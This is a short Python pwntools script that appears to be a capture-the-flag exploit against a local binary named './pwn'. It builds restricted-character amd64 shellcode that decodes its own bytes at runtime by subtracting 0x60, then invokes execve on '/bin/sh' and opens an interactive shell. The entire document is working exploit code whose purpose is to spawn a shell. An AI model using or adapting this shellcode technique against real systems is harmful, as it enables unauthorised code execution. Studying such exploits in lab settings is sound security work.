from pwn import *

context.arch = "amd64"
context.log_level = "debug"

r = process("./pwn")
#gdb.attach(r, "b * 0x4007F8\nc")

payload = '''
	push rdx
	push rdx
	pop rax
	push rax
	pop rdi
	push r15
	pop rsi
	push r15
	push r15
	push r15
	pop rsi
	pop rsi
	pop rsi
	push 0x60
	pop rdx
	sub byte ptr [rax + 0x2a], dl
	sub byte ptr [rax + 0x2a], dl
	sub byte ptr [rax + 0x2b], dl
	sub byte ptr [rax + 0x2d], dl
	sub byte ptr [rax + 0x2e], dl
	push r15
	pop rdx
	push 0x3b
	pop rax
'''
#r15 = 0
#rdx = &shellcode
payload = asm(payload)
print hex(len(payload))

payload += "\x48\x43\x27\x2f\x6f\x65/bin/sh"
r.send(payload)

r.interactive()
